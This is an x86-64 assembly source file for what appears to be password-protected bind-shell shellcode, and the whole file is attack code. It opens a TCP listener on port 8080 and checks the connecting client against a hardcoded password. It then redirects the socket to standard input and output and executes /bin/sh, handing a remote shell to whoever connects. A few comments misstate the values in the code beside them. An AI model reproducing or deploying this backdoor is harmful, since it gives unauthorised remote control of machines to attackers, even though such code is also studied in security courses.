global _start

section .text

_start:


socket:
	; rax -> 41
	push 0x29
	pop rax

	; rdi -> 2
	push 0x02
	pop rdi

	; rsi -> 1
	push 0x01
	pop rsi

	; rdx -> 0
	xor edx, edx

	; execute system call
	syscall

bind:
	; rdi -> socket file descriptor
	mov rdi, rax

	; rax -> 49
	push 0x31
	pop rax

	; creating sockaddr data structure
	push rdx			; pushing padding
	push rdx			; pushing INADDR_ANY
	push word 0x901f	; pushing PORT
	push word 0x02		; pushing AF_INET

	; rsi -> address of sockaddr data structure
	mov rsi, rsp

	; rdx -> 16
	add rdx, 0x10

	; execute system call
	syscall

listen:
	; rax -> 50
	push 0x32
	pop rax

	; rsi -> 0
	xor rsi, rsi

	; execute system call
	syscall

accept:
	; rax -> 43
	push 0x2b
	pop rax

	; rdx -> 0
	mov rdx, rsi

	; execute system call
	syscall

	; save fd
	mov r9, rax

authenticate:

	; read
	mov rax, rsi

	; rdi -> fd
	mov rdi, r9

	; rsi -> allocated room on stack
	sub rsp, 0x10
	mov rsi, rsp

	; rdx -> bytes to read (8)
	mov dl, 0x10

	; execute system call
	syscall

	; compare

	; rax -> hardcoded password
	mov rax, 0x0a37363534333231

	; rdi -> supplied password
	mov rdi, rsi

	; compare rax and rdi
	scasq

	; if not match then jump to finished
	jne finish

file_descriptors:

	; rsi -> 2
	push 0x02
	pop rsi

	; rdi -> file descriptor
	mov rdi, r9

	loop:
		; rax -> 33
		push 0x21
		pop rax

		; execute system call
		syscall

		; decrement file descriptor
		dec rsi

		; repeat
		jns loop

execute:

	; move null (0) to stack
	xor rdx, rdx
	push rdx

	; rbx -> '//bin/sh'[::-1].encode('Hex')
	mov rbx, 0x68732f6e69622f2f

	; moving RBX to the stack
	push rbx

	; rdi -> address of '//bin/sh'[::-1].encode('Hex')
	mov rdi, rsp

	; move null (0) to stack
	push rdx

	; rsi -> address of argv struct
	push rdi
	mov rsi, rsp

	; rax -> 50
	push 0x3b
	pop rax

	; execute system call
	syscall

finish:
	; rax -> 60
	push 0x3c
	pop rax

	; execute system call
	syscall
